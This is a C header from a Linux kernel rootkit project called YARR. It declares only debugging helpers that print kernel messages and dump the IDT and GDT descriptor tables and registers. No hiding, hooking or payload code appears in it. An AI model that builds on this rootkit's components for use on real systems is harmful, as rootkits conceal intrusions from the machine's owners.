/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_IM_A_MIGHTY_DEBUGGER
#define __YARR_IM_A_MIGHTY_DEBUGGER

#include <asm/desc.h>

/***
 * A wrapper for vprintk (the real internal print kernel function) that will
 * print information for debugging purposes just if yarr is compiled with the
 * DEBUG symbol.
 *
 * Any time you want to print some info in order to debug the module but you
 * don't want it to be printed in an "official release" of yarr use it, in fact
 * you should use it when you want to print something.
 */
void debug(const char *fmt, ...); 

/***
 * Prints the IDT entry passed as parameter.
 */
void printIDTEntry(gate_desc *idt_entry); 

/***
 * Prints the GDT entry passed as parameter.
 */
void printGDTEntry(gate_desc *gdt_entry);

/***
 * Prints the nth entry on the IDT.
 */
void printIDTEntryByIndex(unsigned int n);

/***
 * Prints the nth entry on the GDT.
 */
void printGDTEntryByIndex(unsigned int n);

/***
 * Prints the IDTR.
 */
void printIDTR(void);

/***
 * Prints the GDTR.
 */
void printGDTR(void);

/***
 * Prints each entry on IDT with the format of printIDTEntry().
 */
void printIDT(void);

/***
 * Prints each entry on GDT with the format of printGDTEntry().
 */
void printGDT(void);

#endif /* __YARR_IM_A_MIGHTY_DEBUGGER */
